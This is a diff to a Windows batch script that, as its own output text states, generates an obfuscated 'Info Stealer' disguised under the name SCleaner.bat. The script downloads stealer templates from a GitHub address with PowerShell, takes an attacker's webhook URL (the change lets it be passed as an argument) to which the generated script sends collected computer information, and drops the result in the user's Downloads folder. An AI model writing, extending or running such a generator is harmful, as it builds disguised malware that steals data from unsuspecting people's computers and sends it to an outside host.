@@ -1,6 +1,7 @@
 @echo off
 color 0f
 cd /d "%~dp0"
+if not "%1"=="" set webhook=%1
 goto is
 
 :IS 
@@ -13,7 +14,7 @@ echo This will generate a batch script that will collect info from a computer an
 echo.
 if not exist isgen.txt echo Downloading isgen.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/smt/refs/heads/main/Files/isgen.txt -OutFile isgen.txt"
 if not exist isgen2.txt echo Downloading isgen2.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/smt/refs/heads/main/Files/isgen2.txt -OutFile isgen2.txt"
-set /p webhook=Please enter a webhook URL: 
+if "%webhook%"=="" set /p webhook=Please enter a webhook URL: 
 if exist "%TEMP%\SCleaner.bat" del "%TEMP%\SCleaner.bat"
 type isgen.txt>>"%TEMP%\SCleaner.bat"
 echo.>>"%TEMP%\SCleaner.bat"
@@ -25,5 +26,6 @@ ren SCleaner___.bat SCleaner.bat >nul
 move SCleaner.bat "%USERPROFILE%\Downloads\" >nul
 echo.
 echo Info Stealer generated and obfuscated (%USERPROFILE%\Downloads\SCleaner.bat)
-pause >nul
-exit
+if "%1"=="" pause >nul
+if "%1"=="" exit
+if NOT "%1"=="" goto :EOF
